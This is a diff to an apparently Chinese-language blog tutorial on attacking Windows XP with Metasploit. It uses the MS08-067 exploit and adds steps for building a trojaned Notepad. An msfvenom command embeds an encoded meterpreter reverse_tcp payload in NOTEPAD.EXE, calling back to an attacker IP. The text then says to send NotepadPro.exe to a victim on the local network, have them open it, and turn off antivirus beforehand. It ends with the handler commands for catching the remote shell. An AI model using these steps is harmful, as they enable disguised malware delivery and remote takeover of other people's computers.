@@ -55,7 +55,7 @@ search netapi
 ```msf
 use exploit/windows/smb/ms08_067netapi
 ```
-然后你会发现命令的提示符旁边多了个叫做`exploit(windows/smb/ms08_067-netapi)`的东西，表示使用成功。
+然后你会发现命令的提示符旁边多了一些字符，叫做`exploit(windows/smb/ms08_067-netapi)`的东西，表示着漏洞使用成功。
 你可以通过`info *内容名`来详细查看这个内容。
 ![]({{ site.imgbed }}/img/kalihack/03.png)
 
@@ -84,20 +84,52 @@ exploit
 ![]({{ site.imgbed }}/img/kalihack/05.png)
 
 <br /> <br /> <br />
+
 ***
+
 <br />
-### 01.编译软件和发送
+### 前言
 你可以先弄出一个我们经常用的应用程序，然后把连接会话藏到这些应用里。这就是为什么在那些2008、2009年时说的“不要下载网站上未知来源的东西”。  
 但现在我们有了360安全卫士啊，电脑管家啊那些杀毒软件就变得安全多了。对于我这个灰帽黑客兼MC博主来讲，This is a LITTLE problem。  
 But anyways，我们关掉那台Xp的杀毒软件就行了鸭［滑稽］。  
-好吧，我们废话不多说，开始正题。  
+好吧，我们废话不多说，开始正题。
+
+### 01.编译软件和发送
 先在`~/`的位置里放置从电脑上拷贝出来的Notepad.exe  
 然后在kali命令行里输入这段命令:  
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.106.12.175 LPORT=4444 -x NOTEPAD.EXE -e x86/jmp_call_additive -i 4 -k -f exe > ~/NotepadPro.exe
 ```
-这里我们可以看到-p指到了reverse_tcp了。-p全写就是payload鸭。
-这里的LHOST是指你的Kali电脑的ip地址。
-这里的LPORT是指你的Kali电脑的端口。随情况而定。
-这里的-x是指源，然后msfvenom根据源进行修改和添加。  
-至于后面，是指转成X86（32位系统）的软件exe格式。
+这里我们可以看到-p指到了reverse_tcp了。-p全写就是payload鸭。  
+这里的LHOST是指你的Kali电脑的ip地址。  
+这里的LPORT是指你的Kali电脑的端口。随情况而定。  
+这里的-x是指源，然后msfvenom根据源进行修改和添加。    
+至于后面，是指转成X86（32位系统）的软件exe格式。  
+  
+然后，你会发现在`~/`的位置下生成了一个`NotepadPro.exe`。  
+你把它发给在同一个局域网的用户，并指示受害者打开。不过前提是360要关掉。否则..  
+![]({{ site.imgbed }}/img/kalihack/06.png)
+
+### 02.设置内容并等待受害者打开文件
+```msf
+use exploit/multi/handler
+//表示使用活动指向的监听器
+```
+```msf
+set LHOST 192.106.12.175
+//设置本机ip
+```
+```msf
+set LPORT 4444
+//设置本机端口
+```
+```msf
+set payload windows/meterpreter/reverse_tcp
+//设置载荷为*比较开放的tcp*
+```
+```msf
+exploit
+//开启监听
+```
+注意，开启监听后，你不会立刻进入`meterpreter`命令提示符的shell。知道受害者打开所谓的`NotepadPro.exe`应用。  
+可是，受害者打开后，又会关闭。关闭后，你将无法继续使用`meterpreter`。
